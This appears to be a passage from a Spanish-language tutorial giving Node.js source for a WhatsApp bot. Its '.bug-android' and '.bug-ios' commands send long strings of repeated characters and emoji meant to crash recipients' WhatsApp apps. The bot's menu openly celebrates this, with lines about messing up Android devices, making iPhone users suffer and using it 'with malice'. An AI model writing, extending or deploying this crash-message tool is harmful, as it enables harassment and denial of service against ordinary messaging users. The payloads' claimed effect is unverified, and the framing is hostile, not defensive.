const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskyjs/baileys');const qrcode = require('qrcode-terminal');const fs = require('fs');const { handleMenu, handleBugsAndroid, handleBugsIOS } = require('./commands');async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info');    const sock = makeWASocket({
        auth: state,
        printQRInTerminal: true,
    });    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            const shouldReconnect = lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log('Conexión cerrada, intentando reconectar...', shouldReconnect);            if (shouldReconnect) {
                startBot();            }        } else if (connection === 'open') {
            console.log('Bot conectado a WhatsApp!');        }    });    sock.ev.on('creds.update', saveCreds);    sock.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0];        if (!msg.message) return;

        const text = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
        if (text.startsWith('.')) {
            const command = text.split(' ')[0].toLowerCase();            switch (command) {
                case '.menu':
                    await handleMenu(sock, msg);                    break;
                case '.bug-android':
                    await handleBugsAndroid(sock, msg);                    break;
                case '.bug-ios':
                    await handleBugsIOS(sock, msg);                    break;
                default:
                    await sock.sendMessage(msg.key.remoteJid, { text: 'Comando no reconocido. Usa .menu para ver las opciones.' });            }        }    });}startBot();```### Paso 2: Implementar el Menú y los Bugs (`commands/`)#### `menu.js````javascript
async function handleMenu(sock, msg) {
    const menuText = `🔥 *Bug Bot Menu* 🔥
Bienvenido al Bug Bot más cabrón de WhatsApp. Aquí tienes los comandos disponibles:

- *.bug-android*: Envia un bug para joder dispositivos Android. ¡Haz que se cuelguen!- *.bug-ios*: Manda un texto especial para hacer crash en iPhones. ¡Que sufran los usuarios de Apple!- *.info*: Muestra información sobre este bot.¡Usa estos comandos bajo tu propio riesgo y disfruta del caos!`;    await sock.sendMessage(msg.key.remoteJid, { text: menuText });}module.exports = { handleMenu };```#### `bugs-android.js````javascript
async function handleBugsAndroid(sock, msg) {
    const bugText = `💥 *Bug para Android* 💥
Este mensaje está diseñado para causar errores en dispositivos Android. Enviaré una cadena de texto que puede hacer que la app se cierre inesperadamente.Texto del bug: ${'█'.repeat(5000)}`;    await sock.sendMessage(msg.key.remoteJid, { text: 'Enviando bug para Android... Ten cuidado con quién lo compartes.' });    await sock.sendMessage(msg.key.remoteJid, { text: bugText });}module.exports = { handleBugsAndroid };```#### `bugs-ios.js````javascript
async function handleBugsIOS(sock, msg) {
    const bugText = `💥 *Bug para iOS* 💥
Este mensaje está diseñado para causar problemas en dispositivos iOS. Enviaré una combinación de caracteres que puede hacer que WhatsApp se cierre.Texto del bug: ${'🌑'.repeat(1000) + '💣'.repeat(1000)}`;    await sock.sendMessage(msg.key.remoteJid, { text: 'Enviando bug para iOS... Úsalo con malicia.' });    await sock.sendMessage(msg.key.remoteJid, { text: bugText });}module.exports = { handleBugsIOS };
